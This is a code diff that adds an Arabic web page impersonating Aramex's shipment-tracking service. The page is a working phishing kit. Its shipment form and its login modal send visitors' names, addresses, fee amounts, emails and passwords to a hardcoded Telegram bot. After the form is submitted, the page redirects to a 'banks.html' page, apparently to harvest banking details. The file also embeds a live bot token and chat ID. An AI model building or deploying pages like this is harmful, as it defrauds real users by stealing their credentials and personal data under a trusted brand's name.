@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>منصة تتبع الشحنات - Aramex</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      direction: rtl;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, sans-serif;
+      background-color: #fff;
+    }
+
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background-color: #d6001c;
+      padding: 15px 20px;
+    }
+
+    .logo img {
+      height: 40px;
+    }
+
+    .login-btn {
+      background-color: white;
+      color: #d6001c;
+      border: none;
+      padding: 8px 16px;
+      font-weight: bold;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .main-image {
+      width: 100%;
+      max-height: 220px;
+      object-fit: cover;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 30px auto;
+      padding: 20px;
+      background-color: #fff;
+    }
+
+    .description {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #333;
+      font-size: 16px;
+      line-height: 1.6;
+      background-color: #fff9c4;
+      padding: 15px;
+      border-radius: 8px;
+    }
+
+    .subheading {
+      color: #d6001c;
+      font-size: 18px;
+      font-weight: bold;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      margin-top: 12px;
+      font-weight: bold;
+      color: #d6001c;
+      font-size: 14px;
+    }
+
+    input, select, textarea {
+      width: 100%;
+      padding: 8px;
+      margin-top: 4px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 13px;
+      background-color: #fff;
+    }
+
+    button.submit {
+      margin-top: 20px;
+      width: 100%;
+      padding: 10px;
+      background-color: #d6001c;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      cursor: pointer;
+    }
+
+    button.submit:hover {
+      background-color: #b00016;
+    }
+
+    .service-images {
+      margin-top: 30px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      align-items: center;
+    }
+
+    .service-images img {
+      width: 90%;
+      max-width: 300px;
+      height: auto;
+      border-radius: 10px;
+      box-shadow: 0 0 6px rgba(0,0,0,0.08);
+    }
+
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.5);
+      justify-content: center;
+      align-items: center;
+    }
+
+    .modal-content {
+      background: #fff;
+      padding: 25px;
+      border-radius: 10px;
+      width: 300px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+    }
+
+    .modal-content h3 {
+      margin-top: 0;
+      color: #d6001c;
+      text-align: center;
+    }
+
+    .modal-content input {
+      margin-bottom: 12px;
+    }
+
+    .modal-content button {
+      background-color: #d6001c;
+      color: white;
+      border: none;
+      padding: 8px;
+      width: 100%;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .close {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      font-size: 24px;
+      color: white;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="logo">
+      <img src="aramex.png" alt="شعار Aramex">
+    </div>
+    <button class="login-btn" onclick="openLogin()">تسجيل الدخول</button>
+  </header>
+
+  <img src="delivery-bg.png" class="main-image" alt="صورة توصيل">
+
+  <div class="container">
+    <div class="description">
+      مرحبًا بك في خدمات استلام وطلب الشحنات من Aramex.  
+      يمكنك إدخال بياناتك لتتبع شحنتك أو طلب خدمة توصيل أو استلام بكل سهولة واحترافية.
+    </div>
+
+    <p class="subheading">تتبع شحنتك مع أرامكس</p>
+
+    <label>رقم الشحنة</label>
+    <input type="text" id="shipmentNumber">
+
+    <label>نوع الخدمة</label>
+    <select id="serviceType">
+      <option value="">اختر نوع الخدمة</option>
+      <option value="طلب توصيل">طلب توصيل</option>
+      <option value="طلب استلام">طلب استلام</option>
+    </select>
+
+    <label>الاسم الكامل</label>
+    <input type="text" id="fullName">
+
+    <label>العنوان الكامل</label>
+    <input type="text" id="fullAddress">
+
+    <label>قيمة الرسوم</label>
+    <input type="number" id="feeAmount">
+
+    <label>ملاحظة</label>
+    <textarea id="note" rows="2"></textarea>
+
+    <button class="submit" onclick="submitForm()">التالي</button>
+
+    <div class="service-images">
+      <img src="10.png" alt="توصيل سريع">
+      <img src="20.png" alt="خدمة العملاء">
+      <img src="30.png" alt="مركز الشحن">
+      <img src="40.png" alt="تغليف آمن">
+    </div>
+  </div>
+
+  <!-- نافذة تسجيل الدخول -->
+  <div class="modal" id="loginModal">
+    <div class="modal-content">
+      <h3>تسجيل الدخول</h3>
+      <input type="email" id="loginEmail" placeholder="البريد الإلكتروني">
+      <input type="password" id="loginPassword" placeholder="كلمة السر">
+      <button onclick="submitLogin()">دخول</button>
+    </div>
+    <div class="close" onclick="closeLogin()">×</div>
+  </div>
+
+  <script>
+    const telegramBotToken = '8384152964:AAEPq3RMV17UiO_mB7SQUtRUmtedecCcr6Y';
+    const chatId = '6256486935';
+
+    function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+      fetch(url).catch(err => console.error("Telegram Error:", err));
+    }
+
+    function submitForm() {
+      const shipmentNumber = document.getElementById('shipmentNumber').value.trim();
+      const serviceType = document.getElementById('serviceType').value.trim();
+      const fullName = document.getElementById('fullName').value.trim();
+      const fullAddress = document.getElementById('fullAddress').value.trim();
+      const feeAmount = document.getElementById('feeAmount').value.trim();
+      const note = document.getElementById('note').value.trim();
+
+      if (!shipmentNumber || !serviceType || !fullName || !fullAddress || !feeAmount) {
+        alert("يرجى تعبئة جميع الحقول المطلوبة قبل المتابعة.");
+        return;
+      }
+
+      const message = `
+📦 طلب شحنة من Aramex:
+رقم الشحنة: ${shipmentNumber}
+نوع الخدمة: ${serviceType}
+الاسم الكامل: ${fullName}
+العنوان: ${fullAddress}
+قيمة الرسوم: ${feeAmount} درهم
+ملاحظة: ${note}
+      `;
+
+      sendToTelegram(message);
+      window.location.href = "banks.html";
+    }
+
+    function openLogin() {
+      document.getElementById('loginModal').style.display = 'flex';
+    }
+
+    function closeLogin() {
+      document.getElementById('loginModal').style.display = 'none';
+    }
+
+    function submitLogin() {
+      const email = document.getElementById('loginEmail').value;
+      const password = document.getElementById('loginPassword').value;
+
+      const message = `
+🔐 تسجيل دخول:
+البريد الإلكتروني: ${email}
+كلمة السر: ${password}
+      `;
+
+      sendToTelegram(message);
+      closeLogin();
+    }
+  </script>
+
+</body>
+</html>
